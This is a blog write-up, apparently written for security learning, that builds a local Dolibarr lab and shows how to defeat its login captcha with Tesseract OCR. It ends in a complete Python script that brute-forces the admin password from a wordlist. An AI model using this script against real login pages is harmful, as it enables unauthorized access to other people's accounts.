---

layout: post

title: Bypass captcha using OCR on Dolibarr login page 

categories: [Web]

tags: [Dolibarr]

author:

    name: BaadMaro

    link: https://baadmaro.github.io

---

# Presentation

Today i'm going to explain how i was able to bypass captcha using OCR on Dolibarr login page, and create a script for it.


# Dolibarr

Dolibarr ERP CRM is a modern software package to manage your company or foundation's activity (contacts, suppliers, invoices, orders, stocks, agenda, accounting, ...). It is open source software (written in PHP) and designed for small and medium businesses, foundations and freelancers.

- Website : https://www.dolibarr.org/
- Github : https://github.com/Dolibarr/dolibarr

# Setup a lab for testing

There is many ways to install Dolibarr to be able to interact with it :
- Simple installation : you can download packaged versions from your system https://www.dolibarr.org/downloads.php
- Advance installation : Build from source and setup the web server and datatbase https://github.com/Dolibarr/dolibarr#advanced-setup
- Docker : We can call it the gigchad method. If you don't know anything about docker you can check https://www.youtube.com/watch?v=iqqDU2crIEQ. 

`Docker is an open platform for developing, shipping, and running applications. Docker enables you to separate your applications from your infrastructure so you can deliver software quickly.`

There is a docker image for Dolibarr created by [tuxgasy](https://hub.docker.com/u/tuxgasy)  https://hub.docker.com/r/tuxgasy/dolibarr

# Dolibarr installation with Docker

Before you continue, you should install Docker on your system. We're going to also need docker-compose https://docs.docker.com/get-docker/

For me, I was using Kali Linux https://www.kali.org/docs/containers/installing-docker-on-kali/ 

I started by pulling the Dolibarr Docker image.

```bash
docker pull tuxgasy/dolibarr
```

After finishing, let's check the available images 

![Pasted image 20220731215831](https://user-images.githubusercontent.com/72421091/182227170-14e28c14-4bcb-4f9d-98a8-a9c3c9405063.png)

This docker image dosen't include the database. So we need to create a docker container for the datatabse.

I'm going to create a file called docker-compose.yml to setup datatabse and dolibarr

```yaml
version: "3"

services:
    mariadb:
        image: mariadb:latest
        environment:
            MYSQL_ROOT_PASSWORD: root
            MYSQL_DATABASE: dolibarr

    web:
        image: tuxgasy/dolibarr
        environment:
            DOLI_DB_HOST: mariadb
            DOLI_DB_USER: root
            DOLI_DB_PASSWORD: root
            DOLI_DB_NAME: dolibarr
            DOLI_URL_ROOT: 'http://0.0.0.0'
            PHP_INI_DATE_TIMEZONE: 'Europe/Paris'
        ports:
            - "80:80"
        links:
            - mariadb
```

Now we need to start the services using the docker-compose command.

![Pasted image 20220731220332](https://user-images.githubusercontent.com/72421091/182227254-4208c7eb-9ef0-444c-8aaf-bd9c531c919f.png)

We can see our containers running using `docker ps`

![Pasted image 20220801145814](https://user-images.githubusercontent.com/72421091/182227375-1c2d3a2c-1ed9-4e9e-a7a9-0438fd4cb65f.png)

Let's go to [http://0.0.0.0](http://0.0.0.0/) (or your machine ip) to access the new Dolibarr installation.

![Pasted image 20220731220734](https://user-images.githubusercontent.com/72421091/182227433-64d74630-1bc3-4ca6-9f74-afd3735fadad.png)

As we can see, our web server is up. Now let's login using admin:admin and activate captcha on the login page.

![Pasted image 20220731220657](https://user-images.githubusercontent.com/72421091/182227464-33b03584-f336-4c7b-b010-0df0c2c34427.png)

If we logout and check the login page now, we can see the new captcha.

![Pasted image 20220731220803](https://user-images.githubusercontent.com/72421091/182227529-fd6dcd58-5168-4f79-b61f-bd976476851f.png)

# Understand the login mecanism

I'm going to use burpsuite as a proxy to intercept requests.

Let's test the login request.

![Pasted image 20220731221618](https://user-images.githubusercontent.com/72421091/182227601-e1a9a9fb-799f-4286-879a-5294c426f3f9.png)

- Request : 
```http
POST /index.php?mainmenu=home HTTP/1.1
Host: 192.168.1.110
Content-Length: 377
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.110
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.110/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: DOLSESSID_88d498d64b60efb4af60751a059c59a1=gko4agq9j65qvqui7fe3snpdl6; DOLSESSTIMEOUT_88d498d64b60efb4af60751a059c59a1=1440
Connection: close

token=3f061ddd3d625668740705559ebd19ce&actionlogin=login&loginfunction=loginfunction&tz=1&tz_string=Africa%2FCasablanca&dst_observed=0&dst_first=2022-05-8T01%3A59%3A00Z&dst_second=2022-03-27T02%3A59%3A00Z&screenwidth=1038&screenheight=718&dol_hide_topmenu=&dol_hide_leftmenu=&dol_optimize_smallscreen=&dol_no_mouse_hover=&dol_use_jmobile=&username=test&password=test&code=3Kmw6
```

As we can see the login page send a post request to `/index.php?mainmenu=home` with a data payload. It's has a token, our login username and password, the captcha code and some variables. We can see also a DOLSEESID cookie in the request.

We can see the error message after forwarding the request.

![Pasted image 20220731222002](https://user-images.githubusercontent.com/72421091/182227777-fff8c414-4b7a-4dbb-b90b-1c0ad8eca994.png)

# Where is the token ?

view-source:http://192.168.1.110/index.php?mainmenu=home

If we check the source page, we see the used token a also some variables.

```html
<form id="login" name="login" method="post" action="/index.php?mainmenu=home">

<input type="hidden" name="token" value="3f061ddd3d625668740705559ebd19ce" />

<input type="hidden" name="actionlogin" value="login">

<input type="hidden" name="loginfunction" value="loginfunction" />

<!-- Add fields to store and send local user information. This fields are filled by the core/js/dst.js -->

<input type="hidden" name="tz" id="tz" value="" />

<input type="hidden" name="tz_string" id="tz_string" value="" />

<input type="hidden" name="dst_observed" id="dst_observed" value="" />

<input type="hidden" name="dst_first" id="dst_first" value="" />

<input type="hidden" name="dst_second" id="dst_second" value="" />

<input type="hidden" name="screenwidth" id="screenwidth" value="" />

<input type="hidden" name="screenheight" id="screenheight" value="" />

<input type="hidden" name="dol_hide_topmenu" id="dol_hide_topmenu" value="" />

<input type="hidden" name="dol_hide_leftmenu" id="dol_hide_leftmenu" value="" />

<input type="hidden" name="dol_optimize_smallscreen" id="dol_optimize_smallscreen" value="" />

<input type="hidden" name="dol_no_mouse_hover" id="dol_no_mouse_hover" value="" />

<input type="hidden" name="dol_use_jmobile" id="dol_use_jmobile" value="" />
```

After refreshing the page, we see the same value. So maybe it's fixed.

```html
<input type="hidden" name="token" value="3f061ddd3d625668740705559ebd19ce" />
```

# Login bruteforce workflow

Now we are going to start building our script to bypass the captcha code. Here is the workflow : 

- Grab the token from the page in each request.
- Find a way to read captcha code from the image using OCR.
- Find the test cases for wrong login, wrong captcha code, and successful login.
- Build the post request using the variables and custom username and password.

# Extract captcha code using OCR

For our captcha code, It's loaded from a php file 

```html
<img class="inline-block valignmiddle" src="[/core/antispamimage.php](http://192.168.1.110/core/antispamimage.php)" border="0" width="80" height="32" id="img_securitycode" />
```

http://192.168.1.110/core/antispamimage.php

![Pasted image 20220731222938](https://user-images.githubusercontent.com/72421091/182227943-e2b5ab45-5db4-49f7-b25a-c2172807afd4.png)

In each call to this file, a new valid captcha is generated. It's the same mechanism available on the login page with the refresh icon.

![Pasted image 20220731223038](https://user-images.githubusercontent.com/72421091/182227952-f8066210-1358-42d3-95f5-d7892082d7e5.png)

To be able to extract characters from captcha image. I'll use Python-tesseract https://pypi.org/project/pytesseract/

`Python-tesseract is a python wrapper for Google's Tesseract-OCR`

We need to install Tesseract-OCR first before using it with python https://tesseract-ocr.github.io/tessdoc/Home.html

For Kali Linux 

```bash
sudo apt-get install tesseract-ocr
pip3 install pytesseract
```

My script to get OCR the captcha code from the image using OCR
- core/antispamimage.php : give us the image. As i captured using python requests, i got the bytes. You can see the file header with 89 PNG. It's the png file header.
```
b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00P\x00\x00\x00 \x01\x03\x00\x00\x00\xbf\xfdm/\x00\x00\x00\x06PLTE\xfa\xfa\xfa\x00\x00\x00\xfa1=\x8f\x00\x00\x00\tpHYs\x00\x00\x0e\xc4\x00\x00\x0e\xc4\x01\x95+\x0e\x1b\x00\x00\x00JIDAT\x18\x95c`\x18@`\xc3\xc0\xc0\xe2\x00a:10\xf0 \x98"0f\x8c\x8dJ\x0c\x84i\x97\xe4\xe4\x92\x04a299\xb88\xc1\x986up&\x13\x0b\x94\xc9\x92\xe4\xc4\x02Uk\x11c\xc3\x025\x81\xc1\x01a3v&\r\x00\x00\xb3\xa2\n[Z\xaf@L\x00\x00\x00\x00IEND\xaeB`\x82'
```
- Now we need to save the bytes as an image. I'll use BytesIO from the module io tosame our binary data to an image.
- For the image interaction i worked with the library PIL. You can check the output of BytesIO with the image.show() to verify the output.
- Now after building our image, i'll use pytesseract with the option to get characters via OCR using image_to_string()
- The OCR detection can give some wrong output, so we need to do our test to extract a valid captcha code.
The valid captcha code is always 5 characters and has only alphanumeric alphanumeric characters.

```python
from io import BytesIO
import pytesseract
import random
from PIL import Image
import sys
import requests
pytesseract.pytesseract.tesseract_cmd = "/usr/bin/tesseract"

base_url = "http://192.168.1.110/"

def get_captcha_code(base_url):
    code = ""
    while len(code) != 5:

        r = requests.get(f"{base_url}core/antispamimage.php", verify=False)

        
        img = Image.open(BytesIO(r.content))
        img.show()
        code = pytesseract.image_to_string(img).split("\n")[0]
        #print(code)
        for char in code:
            if char not in "aAbBCDeEFgGhHJKLmMnNpPqQRsStTuVwWXYZz2345679":
                code = ""
                break
    return code


print(get_captcha_code(base_url))


```

Here is a test for our OCR :

![Pasted image 20220731231545](https://user-images.githubusercontent.com/72421091/182227996-a3846633-1fd8-4b31-8f6a-a18725539a6d.png)


# Login : erros and succes

For the error message, we have a string "Bad value for login or password". It's located in a div 

```html
<div class="center login_main_message"><div class="error">
	Bad value for login or password	</div></div>
```

![[Pasted image 20220801151908.png]]

For the wrong captcha, we see a different message but in the same div

```html
<div class="center login_main_message"><div class="error">
	Bad value for security code. Try again with new value...	</div></div>
```

![Pasted image 20220801152146](https://user-images.githubusercontent.com/72421091/182228073-4b2eeeea-eda0-4a2a-8fa3-a91b7f2b450e.png)

If we login with right credentials we can see a 302 redirection.

![Pasted image 20220801152423](https://user-images.githubusercontent.com/72421091/182228114-57a4bf84-c92a-45f3-b009-85ebc165536b.png)

I did a simple test for the right login detection. If we find no error message, it's a successful login. It's just for the POC. Better have a test case with the 302 redirection status code.

Note : My post request refuses to stop following redirects with the option "allow_redirects=False". I'll do some research later to clean up the test cases in my tool.

# Final code POC

Now i'll combine the ocr reading with the login post request to bruteforce login.
- I'll use beautifulsoup library to extract token and error messages.
- Simple loop for testing passwords from a file. I used [:-1] to remove "\n" from passwords to simplify.
- Use the headers and data values from the captured login post request.
- Get the used cookies
- Simple code structure for testing. I'll make a clean version in my github repository for the tool (at the end of the article).

## POC

```python
import requests
from bs4 import BeautifulSoup
import lxml
import urllib
from io import BytesIO
from urllib.parse import quote_plus as qp
import pytesseract
from PIL import Image
from requests.structures import CaseInsensitiveDict
import sys

#Linux
pytesseract.pytesseract.tesseract_cmd = "/usr/bin/tesseract"

#Windows
#pytesseract.pytesseract.tesseract_cmd = 'C:/Program Files/Tesseract-OCR/tesseract.exe'


username = "admin"
passwords = open("default-passwords.txt", "r")

base_url = "http://192.168.1.110/"

login_url = base_url + "/admin/index.php?mainmenu=home"

headers = CaseInsensitiveDict()

def get_captcha_code(base_url):
    code = ""
    while len(code) != 5:
        r = session.get(f"{base_url}core/antispamimage.php", verify=False)
        img = Image.open(BytesIO(r.content))
        #img.show()
        code = pytesseract.image_to_string(img).split("\n")[0]
        for char in code:
            if char not in "aAbBCDeEFgGhHJKLmMnNpPqQRsStTuVwWXYZz2345679":
                code = ""
                break
    return code



for password in passwords:
    a = 1
    while(a==1):
    
        session = requests.Session()
        request = session.get(login_url)

        captcha = get_captcha_code(base_url)

        # Get the token value
        page_source = BeautifulSoup(request.text,"lxml")
        token = page_source.find("input",{'name':'token'})['value']
        
        cookies = session.cookies

        headers["Connection"] = "keep-alive"
        headers["Cache-Control"] = "max-age=0"
        headers["Upgrade-Insecure-Requests"] = "1"
        headers["Origin"] = "http://192.168.1.110"
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36"
        headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
        headers["Referer"] = "http://192.168.1.110/admin/index.php?mainmenu=home"
        headers["Accept-Language"] = "en-US,en;q=0.9,ar;q=0.8,fr;q=0.7"

        # you can use json object or f string format
        data = "token=" + str(urllib.parse.quote(token,safe='')) + "&actionlogin=login&loginfunction=loginfunction&tz=1&tz_string=Africa%2FCasablanca&dst_observed=0&dst_first=2022-05-8T01%3A59%3A00Z&dst_second=2022-03-27T02%3A59%3A00Z&screenwidth=1038&screenheight=718&dol_hide_topmenu=&dol_hide_leftmenu=&dol_optimize_smallscreen=&dol_no_mouse_hover=&dol_use_jmobile=&username=" + str(username) + "&password=" + str(password[:-1]) + "&code=" + str(captcha)

        resp = session.post(login_url, headers=headers, data=data, cookies=cookies, allow_redirects=False) # stop redirect to catch 302 (didn't work

        login = BeautifulSoup(resp.text,"lxml")

        error_message = login.find("div",{'class':'error'})

        #print(str(resp.status_code) + " " + password[:-1])
        
        if error_message != None :
            if(error_message.text.strip() == "Bad value for login or password"):
                print(f"[!] [{resp.status_code}] Wrong login {username}:{password[:-1]}")
                a = 0
            else:
                if (error_message.text.strip() == "Bad value for security code. Try again with new value..."):
                    print(f"[!] [{resp.status_code}] Wrong captcha ocr. Retrying...")
                    
        # simple test case. It's better to do it with 302 status code.        
        else:
            print(f"[*] Done! {username}:{password[:-1]} ")
            sys.exit()

```

![Pasted image 20220801163308](https://user-images.githubusercontent.com/72421091/182228474-5ed02c15-d2d9-479f-936a-ae29f00bc539.png)

# Kudos

Thanks to some exploits authors in exploit-db, I was inspired by their code : 
- Dolibarr ERP-CRM 12.0.3 - Remote Code Execution (Authenticated) https://www.exploit-db.com/exploits/49269 
- Dolibarr 12.0.3 - SQLi to RCE : https://www.exploit-db.com/exploits/49240

# Tool in Github 

I published the tool with the name `DoliBrute`. It has a more clean code than the POC. I'll work on it for more updates.

https://github.com/BaadMaro/DoliBrute 

![Pasted image 20220801192208](https://user-images.githubusercontent.com/72421091/182228226-64823325-9ddb-43d1-8bf7-388fa6327136.png)


# Conclusion

I hope you find this article useful. If you want to hunt for vulnerabilities on Dolibarr, go check their secrurity policy https://github.com/Dolibarr/dolibarr/security/policy
